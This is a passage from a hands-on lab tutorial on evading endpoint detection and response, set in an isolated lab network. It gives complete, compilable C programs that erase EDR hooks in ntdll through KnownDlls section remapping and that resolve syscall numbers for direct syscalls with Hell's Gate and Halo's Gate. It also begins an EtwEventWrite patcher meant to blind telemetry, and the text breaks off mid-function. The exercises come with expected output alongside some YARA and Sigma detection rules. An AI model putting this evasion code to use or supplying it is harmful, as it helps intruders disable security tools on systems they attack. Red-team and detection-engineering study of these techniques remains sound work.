# Tutorial: EDR Evasion and Platform-Specific Malware Tradecraft — Hands-On Lab

> **Authorization.** All exercises in this document must be performed exclusively on isolated lab infrastructure that you own or have written authorization to test. These techniques bypass commercial endpoint security products; performing them on unauthorized systems is illegal. The network range `192.168.57.0/24` is used throughout and must not overlap with production networks. Retain written authorization before proceeding.

> **Scope.** NTDLL unhooking (KnownDlls section remapping, `.text` restoration, selective unhooking, peridot/fresh-mapping). Direct and indirect syscalls (Hell's Gate, Halo's Gate, Tartarus' Gate, SysWhispers3, RecycledGate, FreshyCalls). Hardware breakpoint-based syscall invocation (VEH + DR0-DR3). Call-stack spoofing (return address spoofing, stack frame fabrication, NtSetContextThread). ETW patching and provider-level disabling. AMSI bypass (patching, CLR reflection, COM hijacking, context corruption, PowerShell v2 downgrade). AppLocker/WDAC bypass. .NET in-memory assembly loading, DInvoke, Donut shellcode. PPID spoofing and command-line argument spoofing. Early bird APC injection. macOS persistence (LaunchDaemons/Agents, dylib hijacking, DYLD_INSERT_LIBRARIES), TCC bypass, XProtect/MRT evasion, keychain extraction, ESF evasion. Linux persistence (systemd, PAM, SSH, eBPF rootkits), fileless execution (memfd_create), process injection (ptrace, /proc/PID/mem), rootkits (Diamorphine, Reptile, TripleCross), auditd evasion.

---

## Lab Environment

### Network Architecture

```
┌─────────────────────────────────────────────────────────────────────────┐
│                    ISOLATED LAB NETWORK: 192.168.57.0/24                │
│                                                                          │
│  ┌─────────────────────┐    ┌───────────────────────────────────────┐   │
│  │  windows-target      │    │             analysis-station          │   │
│  │  192.168.57.10       │    │             192.168.57.50             │   │
│  │  Windows 10 22H2     │    │             Ubuntu 22.04 LTS          │   │
│  │  • CrowdStrike/      │    │             • Wireshark               │   │
│  │    Defender for      │    │             • Volatility3             │   │
│  │    Endpoint (EDR)    │    │             • YARA                    │   │
│  │  • Sysmon v15        │    │             • osquery                 │   │
│  │  • PPL configured    │    │             • EDREVAL framework       │   │
│  └──────────┬──────────┘    └───────────────────────────────────────┘   │
│             │                                                            │
│  ┌──────────┴──────────┐    ┌─────────────────────────────────────────┐ │
│  │   windows-edr        │    │              linux-lab                  │ │
│  │   192.168.57.20      │    │              192.168.57.40              │ │
│  │   Windows Server     │    │              Ubuntu 22.04 LTS           │ │
│  │   2022               │    │              • Sysdig Falco             │ │
│  │   • Elastic SIEM     │    │              • auditd                   │ │
│  │   • Splunk UF        │    │              • osquery                  │ │
│  │   • Event forwarding │    │              • BPF LSM                  │ │
│  └─────────────────────┘    └─────────────────────────────────────────┘ │
│                                                                          │
│  ┌─────────────────────────────────────────────────────────────────┐    │
│  │                       macos-lab                                  │    │
│  │                       192.168.57.30                              │    │
│  │                       macOS 14 Sonoma (Apple Silicon)            │    │
│  │                       • Jamf Protect / CrowdStrike Falcon        │    │
│  │                       • XProtect, Gatekeeper, TCC               │    │
│  └─────────────────────────────────────────────────────────────────┘    │
└─────────────────────────────────────────────────────────────────────────┘
```

### VM Requirements

| VM | OS | vCPU | RAM | Disk | Special |
|----|-----|------|-----|------|---------|
| windows-target | Windows 10 22H2 x64 | 4 | 8 GB | 80 GB | EDR agent installed, Sysmon v15 |
| windows-edr | Windows Server 2022 | 4 | 16 GB | 120 GB | Elasticsearch + Kibana, Splunk UF |
| macos-lab | macOS 14 Sonoma | 4 | 8 GB | 80 GB | Apple Silicon or Rosetta 2 |
| linux-lab | Ubuntu 22.04 LTS | 4 | 8 GB | 60 GB | Falco, auditd, kernel 6.2+ |
| analysis-station | Ubuntu 22.04 LTS | 4 | 8 GB | 60 GB | Build toolchain, EDREVAL |

### Build Toolchain Setup

**analysis-station — toolchain installation**
```bash
# Native Linux tools
sudo apt-get update -y
sudo apt-get install -y \
    build-essential gcc g++ clang \
    python3 python3-pip python3-venv \
    git curl wget nasm \
    yara jq libssl-dev libelf-dev linux-headers-$(uname -r)

# Python packages for EDREVAL
python3 -m venv /opt/edreval-env
source /opt/edreval-env/bin/activate
pip install --require-hashes -r /opt/edreval/requirements.txt 2>/dev/null || \
    pip install pefile pywin32 colorama tabulate

# Windows cross-compilation (for building Windows payloads on Linux)
sudo apt-get install -y mingw-w64 wine64
# Set up Windows SDK headers for direct-syscall builds
mkdir -p /opt/winsdk/include
# Note: copy Windows SDK headers from a licensed Windows install
```

**windows-target — Sysmon deployment**
```powershell
# Run as Administrator
# Download Sysmon from Microsoft Sysinternals (verify hash before use)
$sysmonHash = "VERIFY_SHA256_FROM_MICROSOFT_BEFORE_USE"
# Install with recommended config
.\Sysmon64.exe -accepteula -i sysmon-config.xml

# Verify installation
Get-Service -Name Sysmon64
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5
```

**windows-target — Sysmon config (`sysmon-config.xml` excerpt)**
```xml
<Sysmon schemaversion="4.90">
  <HashAlgorithms>md5,sha256,IMPHASH</HashAlgorithms>
  <CheckRevocation/>
  <EventFiltering>
    <!-- Process creation with command line -->
    <ProcessCreate onmatch="include"><Rule groupRelation="or">
      <Image condition="is not">C:\Windows\System32\conhost.exe</Image>
    </Rule></ProcessCreate>
    <!-- Image load events (for DLL injection detection) -->
    <ImageLoad onmatch="include"><Rule groupRelation="or">
      <ImageLoaded condition="contains">ntdll.dll</ImageLoaded>
    </Rule></ImageLoad>
    <!-- Memory protection changes -->
    <ProcessTampering onmatch="include"/>
    <!-- CreateRemoteThread -->
    <CreateRemoteThread onmatch="include"/>
  </EventFiltering>
</Sysmon>
```

**linux-lab — Falco installation**
```bash
# Add Falco repository (use current release from falco.org — verify GPG key)
curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
    sudo gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] \
    https://download.falco.org/packages/deb stable main" | \
    sudo tee /etc/apt/sources.list.d/falcosecurity.list
sudo apt-get update -y && sudo apt-get install -y falco

# Enable kernel module driver
sudo falco-driver-loader
sudo systemctl enable --now falco

# Verify
sudo systemctl status falco
sudo journalctl -u falco -f &
```

**linux-lab — auditd baseline**
```bash
sudo apt-get install -y auditd audispd-plugins
sudo systemctl enable --now auditd

# Load comprehensive ruleset
sudo auditctl -D    # flush defaults
sudo auditctl -e 1  # enable
# Monitor execve, ptrace, and kernel module operations
sudo auditctl -a always,exit -F arch=b64 -S execve -k exec_monitor
sudo auditctl -a always,exit -F arch=b64 -S ptrace -k ptrace_monitor
sudo auditctl -a always,exit -F arch=b64 -S init_module,finit_module -k kmod_monitor
sudo auditctl -a always,exit -F arch=b64 -S memfd_create -k fileless_exec
# Save rules
sudo auditctl -l | sudo tee /etc/audit/rules.d/lab.rules
sudo augenrules --load
```

---

## PART A — OFFENSIVE EXERCISES

---

### Exercise 1 — NTDLL Unhooking via KnownDlls

**Objective.** Restore the `.text` section of `ntdll.dll` in the current process from the kernel-maintained `\KnownDlls\ntdll.dll` section object, erasing all user-mode EDR hooks.

**MITRE ATT&CK.** T1562.001 — Impair Defenses: Disable or Modify Tools; T1055.001 — Process Injection: DLL Injection (preparation step).

**Background.** Windows maintains a `\KnownDlls` object directory in the kernel object namespace. The entries are section objects loaded once at boot from the clean on-disk DLLs before any user-mode code runs. Mapping `\KnownDlls\ntdll.dll` yields a byte-for-byte clean copy with original syscall stubs intact — no EDR jmp patches. By copying the clean `.text` section over the hooked one, every patched function is silently restored.

**Step 1 — Create the unhooker project**
```
windows-target> mkdir C:\lab\ex01_unhook && cd C:\lab\ex01_unhook
```

**Step 2 — Source code (`unhook.c`)**
```c
/*
 * unhook.c — NTDLL KnownDlls unhooker
 * Compile: cl.exe /W3 /O2 unhook.c /link /out:unhook.exe
 * Or:      x86_64-w64-mingw32-gcc -O2 -o unhook.exe unhook.c
 */
#include <windows.h>
#include <stdio.h>

/* Native API typedefs */
typedef NTSTATUS (NTAPI *pNtOpenSection)(
    PHANDLE SectionHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes);

typedef NTSTATUS (NTAPI *pNtMapViewOfSection)(
    HANDLE SectionHandle, HANDLE ProcessHandle,
    PVOID *BaseAddress, ULONG_PTR ZeroBits,
    SIZE_T CommitSize, PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize, ULONG InheritDisposition,
    ULONG AllocationType, ULONG Win32Protect);

typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(
    HANDLE ProcessHandle, PVOID BaseAddress);

typedef VOID (NTAPI *pRtlInitUnicodeString)(
    PUNICODE_STRING DestinationString,
    PCWSTR SourceString);

static BOOL VerifyStubIntegrity(void) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) return FALSE;
    FARPROC fn = GetProcAddress(h, "NtAllocateVirtualMemory");
    if (!fn) return FALSE;
    PBYTE p = (PBYTE)fn;
    /* Unhooked stub: 4C 8B D1 (mov r10,rcx) B8 xx xx 00 00 (mov eax,SSN) 0F 05 (syscall) */
    BOOL clean = (p[0] == 0x4C && p[1] == 0x8B && p[2] == 0xD1 &&
                  p[3] == 0xB8 && p[6] == 0x00 && p[7] == 0x00);
    printf("[*] NtAllocateVirtualMemory first bytes: %02X %02X %02X %02X %02X %02X\n",
           p[0], p[1], p[2], p[3], p[4], p[5]);
    printf("[*] Stub status: %s\n", clean ? "CLEAN (unhooked)" : "HOOKED (jmp detected)");
    return clean;
}

BOOL UnhookNtdll(void) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    if (!h) { fprintf(stderr, "[-] GetModuleHandle ntdll failed\n"); return FALSE; }

    pNtOpenSection   Open  = (pNtOpenSection)  GetProcAddress(h, "NtOpenSection");
    pNtMapViewOfSection Map = (pNtMapViewOfSection)GetProcAddress(h, "NtMapViewOfSection");
    pNtUnmapViewOfSection Unmap = (pNtUnmapViewOfSection)GetProcAddress(h, "NtUnmapViewOfSection");
    pRtlInitUnicodeString RtlInit = (pRtlInitUnicodeString)GetProcAddress(h, "RtlInitUnicodeString");
    if (!Open || !Map || !Unmap || !RtlInit) {
        fprintf(stderr, "[-] Failed to resolve native API functions\n");
        return FALSE;
    }

    UNICODE_STRING uName;
    RtlInit(&uName, L"\\KnownDlls\\ntdll.dll");
    OBJECT_ATTRIBUTES oa;
    oa.Length = sizeof(OBJECT_ATTRIBUTES);
    oa.RootDirectory = NULL;
    oa.ObjectName = &uName;
    oa.Attributes = 0;
    oa.SecurityDescriptor = NULL;
    oa.SecurityQualityOfService = NULL;

    HANDLE hSection = NULL;
    NTSTATUS status = Open(&hSection, SECTION_MAP_READ, &oa);
    if (status != 0) {
        fprintf(stderr, "[-] NtOpenSection failed: 0x%08lX\n", status);
        return FALSE;
    }

    PVOID cleanBase = NULL;
    SIZE_T viewSize = 0;
    status = Map(hSection, GetCurrentProcess(), &cleanBase, 0, 0, NULL,
                 &viewSize, 1 /*ViewShare*/, 0, PAGE_READONLY);
    if (status != 0) {
        CloseHandle(hSection);
        fprintf(stderr, "[-] NtMapViewOfSection failed: 0x%08lX\n", status);
        return FALSE;
    }

    /* Parse PE headers to locate .text section in both copies */
    PIMAGE_DOS_HEADER dosHdr  = (PIMAGE_DOS_HEADER)h;
    PIMAGE_NT_HEADERS ntHdrs  = (PIMAGE_NT_HEADERS)((PBYTE)h + dosHdr->e_lfanew);
    PIMAGE_SECTION_HEADER secs = IMAGE_FIRST_SECTION(ntHdrs);

    BOOL found = FALSE;
    for (WORD i = 0; i < ntHdrs->FileHeader.NumberOfSections; i++) {
        if (memcmp(secs[i].Name, ".text", 5) == 0) {
            PVOID dst = (PBYTE)h        + secs[i].VirtualAddress;
            PVOID src = (PBYTE)cleanBase + secs[i].VirtualAddress;
            DWORD tsz = secs[i].Misc.VirtualSize;

            printf("[*] .text section: VA=0x%08lX size=0x%08lX\n",
                   secs[i].VirtualAddress, tsz);

            DWORD oldProt = 0;
            if (!VirtualProtect(dst, tsz, PAGE_EXECUTE_READWRITE, &oldProt)) {
                fprintf(stderr, "[-] VirtualProtect RWX failed: %lu\n", GetLastError());
                Unmap(GetCurrentProcess(), cleanBase);
                CloseHandle(hSection);
                return FALSE;
            }
            memcpy(dst, src, tsz);
            VirtualProtect(dst, tsz, oldProt, &oldProt);
            found = TRUE;
            printf("[+] .text section restored from KnownDlls\n");
            break;
        }
    }

    Unmap(GetCurrentProcess(), cleanBase);
    CloseHandle(hSection);

    if (!found) { fprintf(stderr, "[-] .text section not found in PE headers\n"); return FALSE; }
    return TRUE;
}

int main(void) {
    printf("=== NTDLL KnownDlls Unhooker ===\n\n");
    printf("[*] Pre-unhook stub check:\n");
    VerifyStubIntegrity();
    printf("\n[*] Executing unhook...\n");
    if (!UnhookNtdll()) {
        fprintf(stderr, "[-] Unhook failed\n");
        return 1;
    }
    printf("\n[*] Post-unhook stub check:\n");
    VerifyStubIntegrity();
    printf("\n[+] Done. EDR user-mode hooks erased from this process.\n");
    return 0;
}
```

**Step 3 — Compile and run**
```
windows-target> cl.exe /W3 /O2 C:\lab\ex01_unhook\unhook.c ^
    /link /out:C:\lab\ex01_unhook\unhook.exe

windows-target> C:\lab\ex01_unhook\unhook.exe
```

**Expected output (with EDR hooks active)**
```
=== NTDLL KnownDlls Unhooker ===

[*] Pre-unhook stub check:
[*] NtAllocateVirtualMemory first bytes: E9 AB CD 12 00 FF
[*] Stub status: HOOKED (jmp detected)

[*] Executing unhook...
[*] .text section: VA=0x00001000 size=0x000FC000
[+] .text section restored from KnownDlls

[*] Post-unhook stub check:
[*] NtAllocateVirtualMemory first bytes: 4C 8B D1 B8 18 00
[*] Stub status: CLEAN (unhooked)

[+] Done. EDR user-mode hooks erased from this process.
```

**Step 4 — Verify selective unhooking variant**

Add a selective-only variant that restores just three functions (lower noise):
```c
/* selective_unhook.c — only restore specific functions */
static const char *TARGET_FUNCS[] = {
    "NtAllocateVirtualMemory",
    "NtWriteVirtualMemory",
    "NtCreateThreadEx",
    NULL
};

BOOL SelectiveUnhook(const char *funcName) {
    HMODULE h = GetModuleHandleA("ntdll.dll");
    FARPROC hookedFn = GetProcAddress(h, funcName);
    if (!hookedFn) return FALSE;

    /* Map clean ntdll (same KnownDlls technique) */
    /* ... (same Map sequence as above) ... */
    FARPROC cleanFn = GetProcAddress((HMODULE)cleanBase, funcName);
    if (!cleanFn) { /* Unmap and return */ return FALSE; }

    /* Calculate stub size: typically 0x20 bytes for syscall stubs */
    DWORD stubSize = 0x20;
    DWORD oldProt = 0;
    VirtualProtect((LPVOID)hookedFn, stubSize, PAGE_EXECUTE_READWRITE, &oldProt);
    memcpy((void*)hookedFn, (void*)cleanFn, stubSize);
    VirtualProtect((LPVOID)hookedFn, stubSize, oldProt, &oldProt);
    printf("[+] Selectively unhooked: %s\n", funcName);
    return TRUE;
}
```

**Detection Verification**
```powershell
# On windows-edr — query Sysmon for VirtualProtect on ntdll
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Id -eq 10 -and $_.Message -like "*ntdll*WRITE*" } |
    Select-Object -First 5 TimeCreated, Message

# Check ETW Kernel-Audit-API-Calls provider
# If Threat Intelligence ETW provider is active, NtProtectVirtualMemory
# targeting ntdll .text generates an event
$events = Get-WinEvent -ProviderName "Microsoft-Windows-Kernel-Audit-API-Calls" -ErrorAction SilentlyContinue
$events | Where-Object { $_.Message -like "*ntdll*" } | Select-Object -First 10
```

**YARA Rule**
```yara
rule NTDLL_KnownDlls_Unhook_Code {
    meta:
        description = "Binary contains KnownDlls ntdll unhooking sequence"
        mitre = "T1562.001"
        severity = "critical"
    strings:
        $knowndlls_path = { 5C 00 4B 00 6E 00 6F 00 77 00 6E 00 44 00 6C 00 6C 00 73 00 }
        // L"\\KnownDlls\\ntdll.dll" wide string
        $ntdll_w = "ntdll.dll" wide nocase
        $ntopenSection = "NtOpenSection" ascii
        $ntMapView = "NtMapViewOfSection" ascii
        $text_section = ".text" ascii
        $memcpy_pattern = { 48 8D ?? ?? 48 8D ?? ?? E8 ?? ?? ?? ?? }
    condition:
        uint16(0) == 0x5A4D and
        $knowndlls_path and ($ntopenSection or $ntMapView) and
        ($text_section or $ntdll_w)
}
```

**Sigma Rule**
```yaml
title: NTDLL .text Section Protection Changed to Writable
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Detects NtProtectVirtualMemory call changing ntdll .text to PAGE_EXECUTE_READWRITE
references:
    - https://attack.mitre.org/techniques/T1562/001/
author: lab-exercise
date: 2026-05-18
logsource:
    product: windows
    category: api_call
detection:
    selection:
        EventType: NtProtectVirtualMemory
        TargetModule|contains: 'ntdll.dll'
        NewProtection|contains: 'WRITE'
    condition: selection
falsepositives:
    - Legitimate instrumentation frameworks (very rare)
level: critical
tags:
    - attack.defense_evasion
    - attack.t1562.001
```

**Cleanup**
```
windows-target> taskkill /F /IM unhook.exe 2>nul
windows-target> rd /S /Q C:\lab\ex01_unhook
windows-target> wevtutil cl "Microsoft-Windows-Sysmon/Operational"
```

---

### Exercise 2 — Direct Syscalls via Hell's Gate / Halo's Gate

**Objective.** Implement runtime SSN (System Service Number) resolution using Hell's Gate (unhooked) and Halo's Gate (hooked neighbor scan) algorithms, then invoke `NtAllocateVirtualMemory` via a hand-crafted assembly stub without touching ntdll.

**MITRE ATT&CK.** T1106 — Native API; T1562.001 — Impair Defenses.

**Background.** Direct syscalls bypass EDR user-mode hooks entirely by constructing the `syscall` instruction in attacker-controlled code. The critical step is resolving the SSN — the kernel's function index loaded into `EAX` before `syscall`. Hell's Gate reads it directly from the ntdll stub bytes if unhooked. Halo's Gate handles the case where the target function is hooked by checking neighbors (whose SSNs differ by ±1 per position in the sorted Zw* table).

**Step 1 — Create project**
```
windows-target> mkdir C:\lab\ex02_directsyscall && cd C:\lab\ex02_directsyscall
```

**Step 2 — SSN resolver (`syscall_resolve.c`)**
```c
/*
 * syscall_resolve.c — Hell's Gate + Halo's Gate SSN resolution
 * Compile: cl.exe /W3 /O2 syscall_resolve.c /link /out:directsys.exe
 */
#include <windows.h>
#include <stdio.h>

#define STUB_SIZE        0x20   /* typical syscall stub is 32 bytes */
#define UNHOOK_BYTE0     0x4C   /* mov r10, rcx */
#define UNHOOK_BYTE1     0x8B
#define UNHOOK_BYTE2     0xD1
#define UNHOOK_BYTE3     0xB8   /* mov eax, SSN */

typedef struct _SYSCALL_ENTRY {
    DWORD  ssn;
    PVOID  syscall_ret_addr;  /* address of syscall;ret gadget in ntdll */
    BOOL   resolved;
} SYSCALL_ENTRY, *PSYSCALL_ENTRY;

/* Find a "syscall; ret" gadget in ntdll .text for indirect syscall use */
static PVOID FindSyscallGadget(HMODULE ntdll) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll;
    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)((PBYTE)ntdll + dos->e_lfanew);
    PIMAGE_SECTION_HEADER secs = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (memcmp(secs[i].Name, ".text", 5) == 0) {
            PBYTE start = (PBYTE)ntdll + secs[i].VirtualAddress;
            DWORD sz    = secs[i].Misc.VirtualSize;
            for (DWORD j = 0; j < sz - 2; j++) {
                /* syscall = 0F 05; ret = C3 */
                if (start[j] == 0x0F && start[j+1] == 0x05 && start[j+2] == 0xC3)
                    return (PVOID)(start + j);
            }
        }
    }
    return NULL;
}

/* Hell's Gate: read SSN directly from unhooked stub */
static BOOL HellsGateSSN(PVOID fnAddr, PDWORD pSSN) {
    PBYTE p = (PBYTE)fnAddr;
    if (p[0] == UNHOOK_BYTE0 && p[1] == UNHOOK_BYTE1 &&
        p[2] == UNHOOK_BYTE2 && p[3] == UNHOOK_BYTE3 &&
        p[6] == 0x00 && p[7] == 0x00) {
        *pSSN = (DWORD)(*(PWORD)(p + 4));
        return TRUE;
    }
    return FALSE;   /* stub is hooked */
}

/* Halo's Gate: if target is hooked, scan neighbors to derive SSN */
static BOOL HalosGateSSN(PVOID stubBase, PDWORD pSSN) {
    PBYTE pStub = (PBYTE)stubBase;

    /* Try direct (Hell's Gate) first */
    if (HellsGateSSN(pStub, pSSN)) return TRUE;

    /* Scan neighbors: up to ±500 stubs */
    for (int i = 1; i < 500; i++) {
        /* Scan downward (higher SSNs) */
        PBYTE down = pStub + (i * STUB_SIZE);
        DWORD neighborSSN;
        if (HellsGateSSN(down, &neighborSSN)) {
            *pSSN = neighborSSN - (DWORD)i;
            printf("[*] Halo's Gate: hooked, derived SSN from neighbor +%d: base_ssn=%lu\n",
                   i, *pSSN);
            return TRUE;
        }
        /* Scan upward (lower SSNs) */
        PBYTE up = pStub - (i * STUB_SIZE);
        if (HellsGateSSN(up, &neighborSSN)) {
            *pSSN = neighborSSN + (DWORD)i;
            printf("[*] Halo's Gate: hooked, derived SSN from neighbor -%d: base_ssn=%lu\n",
                   i, *pSSN);
            return TRUE;
        }
    }
    return FALSE;
}

BOOL ResolveSSN(const char *funcName, PSYSCALL_ENTRY entry) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return FALSE;

    PVOID fnAddr = GetProcAddress(ntdll, funcName);
    if (!fnAddr) {
        fprintf(stderr, "[-] GetProcAddress failed for %s\n", funcName);
        return FALSE;
    }

    entry->syscall_ret_addr = FindSyscallGadget(ntdll);
    entry->resolved = HalosGateSSN(fnAddr, &entry->ssn);
    if (entry->resolved) {
        printf("[+] %-40s SSN=0x%04lX  gadget=%p\n",
               funcName, entry->ssn, entry->syscall_ret_addr);
    } else {
        fprintf(stderr, "[-] Could not resolve SSN for %s\n", funcName);
    }
    return entry->resolved;
}

/* Direct syscall stub — x64 assembly embedded as shellcode
 * Executes: mov r10, rcx; mov eax, ssn; syscall; ret
 * Must be in PAGE_EXECUTE_READ memory */
static PVOID CreateDirectStub(DWORD ssn) {
    /* Allocate RWX, write stub, change to RX */
    PVOID mem = VirtualAlloc(NULL, 16, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!mem) return NULL;
    PBYTE b = (PBYTE)mem;
    b[0] = 0x4C; b[1] = 0x8B; b[2] = 0xD1;              /* mov r10, rcx */
    b[3] = 0xB8;                                           /* mov eax, imm32 */
    b[4] = (BYTE)(ssn & 0xFF);
    b[5] = (BYTE)((ssn >> 8) & 0xFF);
    b[6] = 0x00; b[7] = 0x00;
    b[8] = 0x0F; b[9] = 0x05;                             /* syscall */
    b[10] = 0xC3;                                          /* ret */
    DWORD old;
    VirtualProtect(mem, 16, PAGE_EXECUTE_READ, &old);
    return mem;
}

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);

int main(void) {
    printf("=== Direct Syscall Demo: Hell's Gate + Halo's Gate ===\n\n");

    SYSCALL_ENTRY entry = {0};
    if (!ResolveSSN("NtAllocateVirtualMemory", &entry)) return 1;

    printf("\n[*] Creating direct syscall stub for SSN=0x%04lX\n", entry.ssn);
    PVOID stub = CreateDirectStub(entry.ssn);
    if (!stub) { fprintf(stderr, "[-] VirtualAlloc for stub failed\n"); return 1; }

    /* Call NtAllocateVirtualMemory directly through our stub */
    pNtAllocateVirtualMemory NtAlloc = (pNtAllocateVirtualMemory)stub;
    PVOID allocBase = NULL;
    SIZE_T allocSize = 0x1000;
    NTSTATUS status = NtAlloc(
        GetCurrentProcess(), &allocBase, 0,
        &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status == 0) {
        printf("[+] NtAllocateVirtualMemory succeeded via direct syscall: base=%p size=0x%zX\n",
               allocBase, allocSize);
        VirtualFree(allocBase, 0, MEM_RELEASE);
    } else {
        fprintf(stderr, "[-] Syscall failed: NTSTATUS=0x%08lX\n", status);
    }

    VirtualFree(stub, 0, MEM_RELEASE);
    printf("\n[+] Direct syscall test complete.\n");

    /* Print SSNs for common injection-related functions */
    printf("\n[*] Resolving additional SSNs:\n");
    const char *targets[] = {
        "NtWriteVirtualMemory", "NtCreateThreadEx",
        "NtProtectVirtualMemory", "NtOpenProcess",
        "NtQueueApcThread", NULL
    };
    for (int i = 0; targets[i]; i++) {
        SYSCALL_ENTRY e = {0};
        ResolveSSN(targets[i], &e);
    }
    return 0;
}
```

**Step 3 — Compile and run**
```
windows-target> cl.exe /W3 /O2 C:\lab\ex02_directsyscall\syscall_resolve.c ^
    /link /out:C:\lab\ex02_directsyscall\directsys.exe
windows-target> C:\lab\ex02_directsyscall\directsys.exe
```

**Expected output**
```
=== Direct Syscall Demo: Hell's Gate + Halo's Gate ===

[+] NtAllocateVirtualMemory                     SSN=0x0018  gadget=0x7FFEA3B21234
[*] Creating direct syscall stub for SSN=0x0018

[+] NtAllocateVirtualMemory succeeded via direct syscall: base=0x0000023F00010000 size=0x1000

[+] Direct syscall test complete.

[*] Resolving additional SSNs:
[+] NtWriteVirtualMemory                        SSN=0x003A  gadget=0x7FFEA3B21234
[+] NtCreateThreadEx                            SSN=0x00C7  gadget=0x7FFEA3B21234
[+] NtProtectVirtualMemory                      SSN=0x0050  gadget=0x7FFEA3B21234
[+] NtOpenProcess                               SSN=0x0026  gadget=0x7FFEA3B21234
[+] NtQueueApcThread                            SSN=0x0044  gadget=0x7FFEA3B21234
```

**Detection Verification**
```powershell
# Direct syscalls bypass user-mode EDR hooks but NOT kernel-mode telemetry
# ETW Microsoft-Windows-Threat-Intelligence (requires PPL consumer) fires on syscall events
# Check Sysmon for process creation or memory allocation events from directsys.exe
Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
    Where-Object { $_.Message -like "*directsys*" } |
    Select-Object TimeCreated, Id, Message -First 10

# Key indicator: binary with no legitimate reason to have direct syscall stubs
# Look for bytes: 4C 8B D1 B8 [SSN] 00 00 0F 05 C3 in non-ntdll regions
```

**YARA Rule**
```yara
rule Direct_Syscall_Stub_Pattern {
    meta:
        description = "Binary contains hand-crafted syscall stubs (Hell's Gate/Halo's Gate pattern)"
        mitre = "T1106"
        severity = "high"
    strings:
        /* mov r10,rcx; mov eax,N; syscall; ret */
        $stub = { 4C 8B D1 B8 ?? ?? 00 00 0F 05 C3 }
        /* Halo's Gate SSN neighbor scan pattern in code */
        $halo_scan = { 83 ?? 20 [0-8] 83 ?? 20 }  /* add/sub 0x20 (STUB_SIZE) */
        $ntopenSection = "NtOpenSection" ascii
    condition:
        uint16(0) == 0x5A4D and
        ($stub and #stub >= 3)
}
```

**Cleanup**
```
windows-target> taskkill /F /IM directsys.exe 2>nul
windows-target> rd /S /Q C:\lab\ex02_directsyscall
```

---

### Exercise 3 — ETW Patching

**Objective.** Patch `EtwEventWrite` in ntdll to return immediately without writing any events, blinding ETW-based detection for the current process, then verify the patch prevents telemetry from reaching a consumer.

**MITRE ATT&CK.** T1562.006 — Impair Defenses: Indicator Blocking.

**Background.** Event Tracing for Windows (ETW) is the primary telemetry bus for EDRs that do not rely solely on hooks. Functions like `EtwEventWrite`, `EtwEventWriteFull`, and `EtwEventWriteEx` are called by the runtime, CLR, and instrumented code to write events. Patching the prologue of `EtwEventWrite` with `xor eax, eax; ret` (bytes `33 C0 C3`) causes the function to return `ERROR_SUCCESS` immediately — no events are written, no EDR receives telemetry, no PowerShell ScriptBlock logs are written.

**Step 1 — Create ETW consumer to verify (run first on windows-edr)**
```powershell
# windows-edr: start a simple ETW consumer for demonstration
# Subscribe to Microsoft-Windows-DotNETRuntime
$session = [System.Diagnostics.Tracing.EventSource]::new("MyTestSession")
# Or use logman to start a trace
logman create trace LabETWTrace -p "Microsoft-Windows-DotNETRuntime" 0xFFFFFFFF -o C:\lab\etwtrace.etl
logman start LabETWTrace
```

**Step 2 — ETW patcher source (`etw_patch.c`)**
```c
/*
 * etw_patch.c — EtwEventWrite prologue patcher
 * Compile: cl.exe /W3 /O2 etw_patch.c /link /out:etw_patch.exe
 */
#include <windows.h>
#include <stdio.h>

/* Verify that patch bytes are "xor eax,eax; ret" */
static BOOL IsPatchActive(FARPROC fn) {
    PBYTE p = (PBYTE)fn;
    return (p[0] == 0x33 && p[1] == 0xC0 && p[2] == 0xC3);
}

static BOOL PatchFunction(const char *dllName, const char *funcName,
                           const BYTE *patch, SIZE_T patchLen) {
    HMODULE hDll = GetModuleHandleA(dllName);
    if (!hDll) hDll = LoadLibraryA(dllName);
    if (!hDll) { fprintf(stderr, "[-] LoadLibrary %s failed: %lu\n", dllName, GetLastError()); return FALSE; }

    FARPROC fn = GetProcAddress(hDll, funcName);
    if (!fn) { fprintf(stderr, "[-] GetProcAddress %s!%s failed\n", dllName, funcName); return FALSE; }

    printf("[*] %s!%s at %p  first bytes: ", dllName, funcName, (void*)fn);
    for (int i = 0; i < 8; i++) printf("%02X ", ((PBYTE)fn)[i]);
    printf("\n");

    DWORD oldProt = 0;
    if (!VirtualProtect((LPVOID)fn, patchLen, PAGE_EXECUTE_READWRITE, &oldProt)) {
        fprintf(stderr, "[-] VirtualProtect failed: %lu\n", GetLastError());
        return FALSE;
    }
    memcpy((void*)fn, patch, patchLen);
    VirtualProtect((LPVOID)fn, patchLen, oldProt, &oldProt);

    printf("[+] Patched %s!%s\n", dllName, funcName);
    return TRUE;
}

/* Write an ETW event to test whether patch is effective */
static void WriteTestEvent(void) {
    /* Use Windows Runtime ETW provider via ReportEvent as a proxy test */
    HANDLE hLog = RegisterEventSourceA(NULL, "Application");
    if (hLog) {
        const char *msg = "ETW test event - should be suppressed after patch";
        ReportEventA(hLog, EVENTLOG_INFORMATION_TYPE, 0, 0, NULL, 1, 0, &msg, NULL);
        DeregisterEventSource(hLog);
        printf("[*] Attempted to write test event via ReportEvent\n");
    }

    /* Also call EtwEventWrite directly to confirm suppression */
